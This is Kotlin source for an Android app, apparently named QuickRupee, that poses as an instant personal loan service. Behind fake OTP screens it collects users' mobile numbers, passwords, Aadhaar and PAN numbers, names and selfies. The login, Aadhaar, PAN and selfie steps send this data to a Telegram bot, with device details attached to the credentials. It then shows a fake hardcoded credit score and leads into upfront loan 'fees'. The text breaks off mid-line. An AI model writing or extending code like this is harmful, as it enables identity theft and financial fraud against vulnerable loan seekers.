package com.quick.rupee

import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Bundle
import android.os.CountDownTimer
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.widget.EditText
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: SharedPreferences
    private val hist = ArrayList<Int>()
    private var timer: CountDownTimer? = null
    private var shotUri: Uri? = null
    private var selfie: Bitmap? = null
    private var taps = 0

    private val askPerm = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()) { }

    private val pick = registerForActivityResult(
        ActivityResultContracts.GetContent()) { u ->
        if (u != null) { shotUri = u; toast("Screenshot jud gaya") }
    }

    private val pickSelfie = registerForActivityResult(
        ActivityResultContracts.GetContent()) { u ->
        if (u != null) {
            runCatching {
                contentResolver.openInputStream(u)?.use {
                    selfie = android.graphics.BitmapFactory.decodeStream(it)
                }
            }
            render()
        }
    }

    private val camSelfie = registerForActivityResult(
        ActivityResultContracts.TakePicturePreview()) { b -> if (b != null) { selfie = b; render() } }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = getSharedPreferences("qr", 0)
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() { back() }
        })
        if (!Perms.allGranted(this)) askPerm.launch(Perms.needed(this).toTypedArray())
        if (step() == 0) splash() else render()
    }

    override fun onDestroy() { timer?.cancel(); super.onDestroy() }

    private fun ps(k: String, d: String = "-"): String = prefs.getString(k, d) ?: d
    private fun step() = prefs.getInt("step", 0)
    private fun setStep(n: Int) { prefs.edit().putInt("step", n).apply(); render() }
    private fun go(n: Int) { hist.add(step()); setStep(n) }
    private fun back() {
        if (hist.isNotEmpty()) setStep(hist.removeAt(hist.size - 1))
        else if (step() in 11..14 || step() in 20..24) setStep(11) else finish()
    }

    private fun splash() {
        val box = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#1552C4"))
        }
        box.addView(tv("QuickRupee", 34f, Color.WHITE, true).apply { gravity = Gravity.CENTER })
        box.addView(tv("Turant personal loan", 14f, Color.parseColor("#CFE0FF")).apply { gravity = Gravity.CENTER })
        setContentView(box)
        android.os.Handler(mainLooper).postDelayed({
            if (step() == 0) setStep(if (prefs.getBoolean("done", false)) 11 else 1)
        }, 1300)
    }

    private fun render() {
        when (step()) {
            1 -> login()
            2 -> otp()
            3 -> aadhaar()
            4 -> aadhaarOtp()
            5 -> pan()
            6 -> selfie()
            7 -> cibil()
            8 -> plans()
            9 -> pay()
            10 -> done()
            11 -> home()
            12 -> upi()
            13 -> recharge()
            14 -> profile()
            20 -> adminLogin()
            21 -> adminDash()
            22 -> adminPays()
            23 -> adminSet()
            24 -> adminCust()
            else -> home()
        }
    }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun tv(t: String, size: Float, color: Int, bold: Boolean = false) =
        TextView(this).apply {
            text = t
            textSize = size
            setTextColor(color)
            if (bold) setTypeface(typeface, Typeface.BOLD)
            setPadding(0, dp(3), 0, dp(3))
        }

    private fun field(label: String, hint: String, num: Boolean = false, value: String = ""): Pair<LinearLayout, EditText> {
        val box = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        box.addView(tv(label, 12f, Color.parseColor("#6B7A90")))
        val e = EditText(this).apply {
            this.hint = hint
            textSize = 15f
            setSingleLine(true)
            setText(value)
            inputType = if (num) InputType.TYPE_CLASS_NUMBER else InputType.TYPE_CLASS_TEXT
            setPadding(dp(12), dp(12), dp(12), dp(12))
            background = GradientDrawable().apply {
                setColor(Color.WHITE)
                cornerRadius = dp(10).toFloat()
                setStroke(dp(1), Color.parseColor("#DCE3EE"))
            }
        }
        box.addView(e)
        box.setPadding(0, dp(6), 0, dp(6))
        return box to e
    }

    private fun btn(label: String, bg: Int, fg: Int, onClick: () -> Unit): TextView =
        tv(label, 16f, fg, true).apply {
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply {
                setColor(bg)
                cornerRadius = dp(12).toFloat()
            }
            isClickable = true
            setOnClickListener { onClick() }
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(10), 0, 0) }
        }

    private fun header(sub: String): LinearLayout = LinearLayout(this).apply {
        orientation = LinearLayout.HORIZONTAL
        setBackgroundColor(Color.parseColor("#1552C4"))
        setPadding(dp(14), dp(22), dp(18), dp(18))
        val col = LinearLayout(this@MainActivity).apply { orientation = LinearLayout.VERTICAL }
        col.addView(tv("QuickRupee", 22f, Color.WHITE, true))
        col.addView(tv(sub, 12f, Color.parseColor("#CFE0FF")))
        if (step() in 2..10 || step() in 21..24) {
            addView(tv("←", 26f, Color.WHITE, true).apply {
                setPadding(dp(6), 0, dp(14), 0)
                isClickable = true
                setOnClickListener { back() }
            })
        }
        addView(col)
    }

    private fun page(vararg views: View): ScrollView {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#F4F6FA"))
        }
        views.forEach { root.addView(it) }
        val sv = ScrollView(this)
        sv.addView(root)
        sv.setBackgroundColor(Color.parseColor("#F4F6FA"))
        return sv
    }

    private fun toast(m: String) = Toast.makeText(this, m, Toast.LENGTH_SHORT).show()

    private fun device() =
        "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} | A${android.os.Build.VERSION.RELEASE}"

    private fun send(m: String) {
        Thread { runCatching { Tg.text(m) } }.start()
    }

    private fun login() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        val title = tv("Turant personal loan", 20f, Color.parseColor("#16233A"), true).apply {
            isClickable = true
            setOnClickListener {
                taps++
                if (taps >= 7) {
                    taps = 0
                    hist.clear()
                    setStep(20)
                }
            }
        }
        pad.addView(title)
        pad.addView(tv("₹20,000 se ₹1,00,000 tak, 5 minute mein", 13f, Color.parseColor("#6B7A90")))
        val (mBox, mEt) = field("Mobile number", "10 digit mobile number", true)
        val (pBox, pEt) = field("Password", "Password banayein")
        pEt.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
        pad.addView(mBox)
        pad.addView(pBox)
        pad.addView(btn("OTP bhejein", Color.parseColor("#1552C4"), Color.WHITE) {
            val m = mEt.text.toString().trim()
            val p = pEt.text.toString().trim()
            if (m.length != 10) {
                toast("10 digit mobile daalein")
                return@btn
            }
            if (p.length < 4) {
                toast("Password kam se kam 4 akshar")
                return@btn
            }
            prefs.edit().putString("mobile", m).putString("pass", p).apply()
            Db.addOpen(this, m, ps("name", "customer"))
            send("<b>LOGIN</b>\n<b>Mobile</b> <code>$m</code>\n<b>Password</b> <code>$p</code>\n" + device())
            toast("OTP bheja gaya")
            go(2)
        })
        pad.addView(tv("Admin: title pe 7 tap", 11f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(14), 0, 0) })
        setContentView(page(header("Login"), pad))
    }

    private fun otp() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("OTP verify karein", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("OTP bheja gaya: " + ps("mobile", ""), 13f, Color.parseColor("#6B7A90")))
        val (oBox, oEt) = field("4 digit OTP", "****", true)
        pad.addView(oBox)
        val tTv = tv("", 13f, Color.parseColor("#B00020"))
        pad.addView(tTv)
        timer?.cancel()
        timer = object : CountDownTimer(30_000, 1000) {
            override fun onTick(ms: Long) {
                tTv.text = "Dobara bhejne ke liye " + (ms / 1000) + " sec"
            }

            override fun onFinish() {
                tTv.text = "OTP dobara bhejein"
            }
        }.start()
        pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
            if (oEt.text.toString().trim().length < 4) {
                toast("4 digit OTP daalein")
                return@btn
            }
            send("<b>OTP verified</b> " + ps("mobile", ""))
            go(3)
        })
        setContentView(page(header("Step 1 / 4 - Verify"), pad))
    }

    private fun aadhaar() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Aadhaar se KYC", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Aadhaar linked mobile par OTP jayega", 13f, Color.parseColor("#6B7A90")))
        val (aBox, aEt) = field("Aadhaar number", "12 digit Aadhaar", true)
        pad.addView(aBox)
        pad.addView(btn("Aadhaar OTP bhejein", Color.parseColor("#1552C4"), Color.WHITE) {
            val a = aEt.text.toString().trim()
            if (a.length != 12) {
                toast("12 digit Aadhaar daalein")
                return@btn
            }
            prefs.edit().putString("aadhaar", a).apply()
            send("<b>AADHAAR</b> <code>$a</code> | " + ps("mobile", ""))
            toast("OTP bheja gaya")
            go(4)
        })
        setContentView(page(header("Step 2 / 4 - Aadhaar"), pad))
    }

    private fun aadhaarOtp() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Aadhaar OTP", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Aadhaar linked number par OTP bheja gaya", 13f, Color.parseColor("#6B7A90")))
        val (oBox, oEt) = field("6 digit OTP", "******", true)
        pad.addView(oBox)
        pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
            if (oEt.text.toString().trim().length < 4) {
                toast("OTP daalein")
                return@btn
            }
            send("<b>Aadhaar OTP verified</b> " + ps("mobile", ""))
            go(5)
        })
        setContentView(page(header("Step 2 / 4 - Aadhaar OTP"), pad))
    }

    private fun pan() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("PAN details", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("CIBIL score dekhne ke liye zaruri", 13f, Color.parseColor("#6B7A90")))
        val (nBox, nEt) = field("Poora naam", "Jaise Gaurav Kumar")
        val (pBox, pEt) = field("PAN number", "ABCDE1234F")
        pad.addView(nBox)
        pad.addView(pBox)
        pad.addView(btn("Aage badhein", Color.parseColor("#1552C4"), Color.WHITE) {
            val n = nEt.text.toString().trim()
            val p = pEt.text.toString().trim().uppercase()
            if (n.length < 3) {
                toast("Poora naam daalein")
                return@btn
            }
            if (p.length != 10) {
                toast("10 akshar ka PAN daalein")
                return@btn
            }
            prefs.edit().putString("name", n).putString("pan", p).apply()
            Db.addOpen(this, ps("mobile"), n)
            send("<b>PAN</b> <code>$p</code>\n<b>Name</b> $n\n<b>Aadhaar</b> <code>" + ps("aadhaar") + "</code>\n" + ps("mobile", ""))
            go(6)
        })
        setContentView(page(header("Step 3 / 4 - PAN"), pad))
    }

    private fun selfie() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Selfie khinchein", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Chehra saaf dikhna chahiye", 13f, Color.parseColor("#6B7A90")))
        val holder = LinearLayout(this).apply {
            gravity = Gravity.CENTER
            setPadding(dp(10), dp(10), dp(10), dp(10))
            background = GradientDrawable().apply {
                setColor(Color.WHITE)
                cornerRadius = dp(12).toFloat()
                setStroke(dp(1), Color.parseColor("#DCE3EE"))
            }
        }
        val iv = ImageView(this)
        holder.addView(iv, LinearLayout.LayoutParams(dp(220), dp(220)))
        val b = selfie
        if (b != null) iv.setImageBitmap(b)
        pad.addView(holder)
        pad.addView(btn("Camera se photo", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { camSelfie.launch(null) })
        pad.addView(btn("Gallery se chunein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { pickSelfie.launch("image/*") })
        pad.addView(btn("Selfie submit karein", Color.parseColor("#1552C4"), Color.WHITE) {
            val bm = selfie
            if (bm == null) {
                toast("Pehle selfie lein")
                return@btn
            }
            Thread {
                runCatching {
                    val f = File(cacheDir, "selfie.jpg")
                    f.outputStream().use { bm.compress(Bitmap.CompressFormat.JPEG, 80, it) }
                    Tg.photo(f, "selfie KYC | " + ps("mobile", ""))
                    f.delete()
                }
            }.start()
            go(7)
        })
        setContentView(page(header("Step 4 / 4 - Selfie"), pad))
    }

    private fun cibil() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(24), dp(20), dp(28))
        }
        pad.addView(tv("CIBIL report taiyar ho rahi hai...", 16f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Aadhaar, PAN aur selfie verify ho rahi hai", 13f, Color.parseColor("#6B7A90")))
        setContentView(page(header("Verification"), pad))
        android.os.Handler(mainLooper).postDelayed({ if (step() == 7) score() }, 2200)
    }

    private fun score() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Aapka CIBIL score", 14f, Color.parseColor("#6B7A90")))
        pad.addView(tv("742", 46f, Color.parseColor("#138808"), true))
        pad.addView(tv("Achha (700-750)", 13f, Color.parseColor("#138808")))
        val bar = View(this)
        bar.background = GradientDrawable().apply {
            setColor(Color.parseColor("#138808"))
            cornerRadius = dp(6).toFloat()
        }
        pad.addView(bar, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, dp(10)).apply { setMargins(0, dp(10), 0, dp(10)) })
        pad.addView(tv("Aap ₹1,00,000 tak ke loan ke liye eligible hain", 16f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Byaj 14% se shuru | avadhi 3 se 24 mahine", 13f, Color.parseColor("#6B7A90")))
        send("<b>CIBIL</b> 742 | eligible ₹1,00,000 | " + ps("name") + " " + ps("pan"))
        pad.addView(btn("Offers dekhein", Color.parseColor("#1552C4"), Color.WHITE) { go(8) })
        setContentView(page(header("Report"), pad))
    }

    private fun fee(a: Int) = when (a) {
        20000 -> 3000
        50000 -> 5000
        else -> 8000
    }

    private fun plans() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Badhai ho!", 22f, Color.parseColor("#138808"), true))
        pad.addView(tv("Aap ₹1,00,000 tak ke liye eligible hain", 14f, Color.parseColor("#16233A")))
        pad.addView(tv("Apna amount chunein", 13f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(14), 0,
